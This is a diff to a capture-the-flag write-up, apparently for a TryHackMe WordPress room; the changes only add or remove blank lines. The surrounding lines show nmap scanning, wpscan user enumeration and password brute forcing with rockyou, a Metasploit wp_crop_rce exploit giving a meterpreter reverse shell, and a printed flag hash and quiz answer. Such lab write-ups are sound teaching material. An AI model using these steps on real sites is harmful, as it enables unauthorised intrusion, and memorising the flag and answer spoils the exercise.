@@ -13,6 +13,7 @@
 ## Enumeration
 
 - Running Nmap
+
 ```bash
 nmap -sV <MACHINE_IP> | tee nmap.output 
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-16 16:19 IST
@@ -31,6 +32,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.63 seconds
 ```
 
 - Running wpscan along with user enumeration
+
 ```
 wpscan --url <MACHINE_IP> --enumerate u
 _______________________________________________________________
@@ -145,6 +147,7 @@ wpscan --url <MACHINE_IP> -P /usr/share/wordlists/rockyou.txt -U users.txt
 ```
 
 - Using Metasploit:
+
 ```bash
 msf6 exploit(multi/http/wp_crop_rce) > options
 
@@ -242,6 +245,7 @@ msf6 exploit(multi/http/wp_crop_rce) > exploit
 meterpreter > pwd
 /var/www/wordpress
 ```
+
 - You can notice that the exploit was successfully executed, but still there was no meterpreter shell. 
 - This is because, I forgot to set LHOST to <TRYHACKME_IP>.
 - After setting my Tryhackme IP, I was able to get the meterpreter shell.
@@ -345,7 +349,6 @@ root@blog:/# cat /media/usb/user.txt
 cat /media/usb/user.txt
 c8421899aae571f7af486492b71a8ab7
 ```
-
 
 ### Where was user.txt found?
 - **Answer:** /media/usb
